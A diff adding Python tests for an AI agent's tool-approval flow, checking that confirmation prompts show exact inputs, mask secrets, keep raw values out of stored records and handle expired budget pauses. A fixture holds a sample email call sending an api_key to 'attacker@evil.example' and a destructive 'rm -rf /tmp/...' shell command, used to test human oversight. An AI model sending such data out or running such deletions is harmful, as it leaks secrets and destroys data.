@@ -103,6 +103,33 @@ def _assert_history_paired(messages):
             raise AssertionError("two user messages are adjacent")
 
 
+def _rich_calls():
+    body = "B" * 300
+    items = [f"item-{index:02d}" for index in range(20)]
+    command = "rm -rf /tmp/" + ("a" * 180)
+    return {
+        "email": {
+            "id": "c1",
+            "name": "send_email",
+            "input": {
+                "to": "attacker@evil.example",
+                "subject": "Quarterly report",
+                "body": body,
+                "attachments": items,
+                "api_key": "sk-live-supersecret-0123456789",
+            },
+        },
+        "shell": {
+            "id": "c2",
+            "name": "run_command",
+            "input": {"command": command},
+        },
+        "body": body,
+        "items": items,
+        "command": command,
+    }
+
+
 class _PauseHarness(TransactionTestCase):
     def setUp(self):
         super().setUp()
@@ -341,6 +368,51 @@ class HeldBatchTests(_PauseHarness):
         self.assertTrue(any(e.kind == "error" for e in events))
 
 
+class ApprovalPromptShowsExactInputTests(_PauseHarness):
+    @override_settings(SHELL_EXEC_PROFILE="standard")
+    def test_the_prompt_shows_every_raw_value_and_names_restricted_keys(self):
+        rich = _rich_calls()
+        calls = [rich["email"], rich["shell"]]
+        turn = self._turn()
+        self._llm([
+            _response(
+                [
+                    _tool(call["id"], call["name"], call["input"])
+                    for call in calls
+                ],
+                stop_reason="tool_use",
+            ),
+        ])
+
+        events = _run(_collect(run_agent_loop(
+            user_message="send it", context=self._context(turn), preferences={},
+        )))
+
+        confirmation = next(e for e in events if e.kind == "confirmation")
+        message = confirmation.data["message"]
+        self.assertIn(rich["email"]["input"]["to"], message)
+        self.assertIn(rich["body"], message)
+        for item in rich["items"]:
+            self.assertIn(item, message)
+        self.assertIn(rich["command"], message)
+        self.assertIn("api_key", message)
+        self.assertIn("[hidden secret value]", message)
+        self.assertNotIn("sk-live-supersecret-0123456789", message)
+
+        # The plaintext row keeps the masked display, never the raw input.
+        record = WorkflowApprovalRecord.objects.get(kind="agent_loop")
+        blob = json.dumps({
+            "message": record.approval_message,
+            "params": record.sanitized_params,
+            "metadata": record.metadata,
+        })
+        self.assertNotIn(rich["email"]["input"]["to"], blob)
+        self.assertNotIn(rich["body"], blob)
+        self.assertNotIn(rich["command"], blob)
+        self.assertNotIn("sk-live-supersecret-0123456789", blob)
+        self.assertNotIn("api_key", record.sanitized_params["calls"][0]["params"])
+
+
 class BudgetAndQuotaRestartTests(_PauseHarness):
     @override_settings(AGENT_TURN_TOKEN_BUDGET=10, AGENT_TURN_TOKEN_BUDGET_MAX=100000)
     def test_budget_pause_survives_a_restart(self):
@@ -448,6 +520,90 @@ class ExpiryAndTimeTests(_PauseHarness):
         ))
 
 
+class ExpiredBudgetQuotaHistoryTests(_PauseHarness):
+    def _expire(self, turn):
+        turn.refresh_from_db()
+        turns_mod.transition(
+            str(turn.pk), turn.version, "expired",
+            from_state="paused", end_reason="pause_expired",
+        )
+        Turn.objects.filter(pk=turn.pk).update(
+            pause_expires_at=timezone.now() - timedelta(minutes=1),
+        )
+
+    def _answered_step(self):
+        return [
+            {"role": "user", "content": "what is the weather?"},
+            {"role": "assistant", "content": [
+                _tool("c1", "get_weather", {"city": "Nairobi"}),
+            ]},
+            {"role": "user", "content": [{
+                "type": "tool_result",
+                "tool_use_id": "c1",
+                "content": '{"status": "success"}',
+            }]},
+        ]
+
+    def _results_for(self, messages, call_id):
+        return [
+            block.get("tool_use_id")
+            for message in messages
+            if isinstance(message.get("content"), list)
+            for block in message["content"]
+            if isinstance(block, dict) and block.get("type") == "tool_result"
+            and block.get("tool_use_id") == call_id
+        ]
+
+    def test_an_expired_quota_pause_does_not_duplicate_an_answered_step(self):
+        turn = self._turn()
+        state = {
+            "messages": self._answered_step(),
+            "awaiting_budget": True,
+            "awaiting_quota": True,
+            "end_reason": "quota",
+            "token_budget": 50000,  # nosec B105 — test fixture, not a credential
+            "tokens_used": 10,
+            "active_seconds": 0.0,
+        }
+        self.assertTrue(self._pause(turn, [], kind="quota", state=state))
+        self._expire(turn)
+        llm = self._llm([_response([_text("The hourly limit freed; nothing ran.")])])
+
+        events = _run(_collect(resume_after_expiry(
+            context=self._context(turn), preferences={},
+        )))
+
+        messages = llm.create_message.await_args.kwargs["messages"]
+        _assert_history_paired(messages)
+        self.assertEqual(self._results_for(messages, "c1"), ["c1"])
+        self.assertFalse(any(e.kind == "paused" for e in events))
+
+    def test_an_expired_budget_pause_answers_instead_of_repausing(self):
+        turn = self._turn()
+        state = {
+            "messages": self._answered_step(),
+            "awaiting_budget": True,
+            "end_reason": "asked_for_more",
+            "token_budget": 10,  # nosec B105 — test fixture, not a credential
+            "tokens_used": 10,
+            "active_seconds": 0.0,
+        }
+        self.assertTrue(self._pause(turn, [], kind="budget", state=state))
+        self._expire(turn)
+        llm = self._llm([_response([_text("It expired before I replied.")])])
+
+        events = _run(_collect(resume_after_expiry(
+            context=self._context(turn), preferences={},
+        )))
+
+        messages = llm.create_message.await_args.kwargs["messages"]
+        _assert_history_paired(messages)
+        self.assertEqual(self._results_for(messages, "c1"), ["c1"])
+        self.assertEqual(llm.create_message.await_count, 1)
+        self.assertTrue(any(e.kind == "done" for e in events))
+        self.assertFalse(any(e.kind == "paused" for e in events))
+
+
 class CoordinatorRestartTests(_PauseHarness):
     def _coordinator(self, *, extra_patches=None):
         from asgiref.sync import async_to_sync
@@ -547,6 +703,80 @@ class CoordinatorRestartTests(_PauseHarness):
         run("yes")
         self.assertEqual(self.execute_tool.await_count, 1)
         self.assertEqual(self.execute_tool.await_args.args[1], call["input"])
+
+    @override_settings(SHELL_EXEC_PROFILE="standard")
+    def test_a_question_reshows_the_exact_input_not_the_masked_row(self):
+        rich = _rich_calls()
+        calls = [rich["email"], rich["shell"]]
+        self._llm([
+            _response(
+                [
+                    _tool(call["id"], call["name"], call["input"])
+                    for call in calls
+                ],
+                stop_reason="tool_use",
+            ),
+            _response([_text("It sends the report and cleans up.")]),
+        ])
+        run = self._coordinator()
+        run("send it")
+        run.sent.clear()
+
+        run("what does that do?")
+
+        question_output = "".join(run.sent)
+        self.assertIn("Should I go ahead", question_output)
+        self.assertIn(rich["email"]["input"]["to"], question_output)
+        self.assertIn(rich["body"], question_output)
+        for item in rich["items"]:
+            self.assertIn(item, question_output)
+        self.assertIn(rich["command"], question_output)
+        self.assertIn("api_key", question_output)
+        self.assertIn("[hidden secret value]", question_output)
+        self.assertEqual(self.execute_tool.await_count, 0)
+
+    @override_settings(AGENT_TURN_TOKEN_BUDGET=10, AGENT_TURN_TOKEN_BUDGET_MAX=100000)
+    def test_a_question_that_runs_out_of_budget_names_the_dropped_action_first(self):
+        call = {"id": "c1", "name": "send_email", "input": {"to": "a@b.c"}}
+        self._llm([
+            _response(
+                [_tool("c1", "send_email", call["input"])],
+                stop_reason="tool_use",
+                usage={"input_tokens": 1, "output_tokens": 1},
+            ),
+            _response(
+                [_tool("w1", "get_weather", {"city": "Nairobi"})],
+                stop_reason="tool_use",
+                usage={"input_tokens": 50, "output_tokens": 50},
+            ),
+            _response([_text("Continuing from where it stopped.")]),
+        ])
+        run = self._coordinator()
+        run("send it")
+        run.sent.clear()
+
+        run("what does that do?")
+
+        question_output = "".join(run.sent)
+        self.assertIn("send email", question_output)
+        self.assertIn("not run", question_output)
+        self.assertIn("dropped", question_output)
+        self.assertIn("more budget", question_output)
+        self.assertLess(
+            question_output.index("send email"),
+            question_output.index("more budget"),
+        )
+        executed = [c.args[0] for c in self.execute_tool.await_args_list]
+        self.assertEqual(executed, ["get_weather"])
+
+        run.sent.clear()
+        run("yes")
+
+        self.assertIn("Continuing with more budget", "".join(run.sent))
+        self.assertEqual(
+            [c.args[0] for c in self.execute_tool.await_args_list],
+            ["get_weather"],
+        )
 
     def test_autopilot_never_confirms_a_batch_that_holds_a_non_shell_call(self):
         safe = {"id": "a1", "name": "get_weather", "input": {"city": "Nairobi"}}
@@ -734,6 +964,33 @@ class MissingApprovalTests(_PauseHarness):
         ))
         turn.refresh_from_db()
         self.assertEqual(turn.state, "failed")
+
+    def test_a_row_write_failure_logs_the_exception_class_not_its_text(self):
+        turn = self._turn()
+        self._llm([
+            _response(
+                [_tool("c1", "send_email", {"to": "a@b.c"})],
+                stop_reason="tool_use",
+            ),
+        ])
+        secret_detail = "customer-secret-should-not-be-logged"  # nosec B105 — test fixture, not a credential
+        with (
+            patch(
+                "orchestration.agent_loop.save_pending_confirmation",
+                new=AsyncMock(side_effect=RuntimeError(secret_detail)),
+            ),
+            patch("orchestration.agent_loop.logger.error") as log_error,
+        ):
+            _run(_collect(run_agent_loop(
+                user_message="send it", context=self._context(turn), preferences={},
+            )))
+
+        logged = " ".join(
+            " ".join(str(arg) for arg in call.args)
+            for call in log_error.call_args_list
+        )
+        self.assertNotIn(secret_detail, logged)
+        self.assertIn("RuntimeError", logged)
 
     def test_a_missing_or_mismatched_hash_set_denies(self):
         turn = self._turn()
